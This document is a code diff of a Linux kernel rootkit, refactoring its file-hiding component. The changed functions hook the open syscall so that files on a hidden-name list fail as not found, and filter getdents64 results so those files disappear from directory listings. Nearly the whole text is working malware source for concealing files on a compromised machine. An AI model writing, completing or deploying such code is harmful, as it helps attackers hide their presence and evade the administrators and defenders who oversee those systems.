@@ -1,4 +1,5 @@
-#include "syscall_metadata.h"
+#include "hide_file.h"
+#include "rootkit_cmd.h"
 #include <linux/dirent.h>
 #include <linux/module.h>
 
@@ -23,7 +24,6 @@ static bool ends_with(const char *str, const char *suffix) {
   return strcmp(str + (str_len - suffix_len), suffix) == 0;
 }
 
-bool is_hidden_file(const char *str);
 bool is_hidden_file(const char *str) {
   for (int i = 0; i < NUM_STRINGS; i++) {
     if (ends_with(str, hidden_filenames[i])) {
@@ -37,38 +37,30 @@ bool is_hidden_file(const char *str) {
 
 #define PATH_BUFFER_SIZE 1024
 
-void open_enter_handler(char *__user filename,
-                        struct syscall_metadata *syscall_metadat);
-void open_enter_handler(char *__user filename,
-                        struct syscall_metadata *syscall_metadata) {
-  syscall_metadata->metadata.open_metadata.should_fail = false;
+void open_enter_handler(char *__user filename, struct rootkit_cmd *cmd) {
+  cmd->data.open_data.should_fail = false;
 
   char buf[PATH_BUFFER_SIZE];
   int n = strncpy_from_user(buf, filename, PATH_BUFFER_SIZE);
   if (n) {
     for (int i = 0; i < NUM_STRINGS; i++) {
       if (is_hidden_file(buf)) {
-        syscall_metadata->metadata.open_metadata.should_fail = true;
+        cmd->data.open_data.should_fail = true;
       }
     }
   }
 }
 
-void open_exit_handler(struct pt_regs *syscall_regs,
-                       struct syscall_metadata syscall_metadata);
-void open_exit_handler(struct pt_regs *syscall_regs,
-                       struct syscall_metadata syscall_metadata) {
-  if (syscall_metadata.metadata.open_metadata.should_fail) {
+void open_exit_handler(struct pt_regs *syscall_regs, struct rootkit_cmd cmd) {
+  if (cmd.data.open_data.should_fail) {
     syscall_regs->ax = -2;
   }
 }
 
-void getdents64_exit_handler(struct pt_regs *syscall_regs,
-                             struct syscall_metadata syscall_metadata);
-void getdents64_exit_handler(struct pt_regs *syscall_regs,
-                             struct syscall_metadata syscall_metadata) {
+void getdents64_exit_handler(struct pt_regs *regs,
+                             struct rootkit_cmd syscall_metadata) {
 
-  int nread = *(int *)&syscall_regs->ax;
+  int nread = *(int *)&regs->ax;
 
   if (nread == -1) {
     return;
@@ -79,9 +71,8 @@ void getdents64_exit_handler(struct pt_regs *syscall_regs,
   }
 
   struct linux_dirent64 *__user dirents_user =
-      syscall_metadata.metadata.get_dents_metadata.entries;
-  unsigned int dirents_user_size =
-      syscall_metadata.metadata.get_dents_metadata.buf_size;
+      syscall_metadata.data.getdents_data.entries;
+  unsigned int dirents_user_size = syscall_metadata.data.getdents_data.buf_size;
 
   void *buf = kmalloc(dirents_user_size, GFP_KERNEL);
   int n = copy_from_user(buf, dirents_user, dirents_user_size);
@@ -108,7 +99,7 @@ void getdents64_exit_handler(struct pt_regs *syscall_regs,
   if (!n) {
     goto free;
   }
-  syscall_regs->ax = nread;
+  regs->ax = nread;
 free:
   kfree(buf);
 }
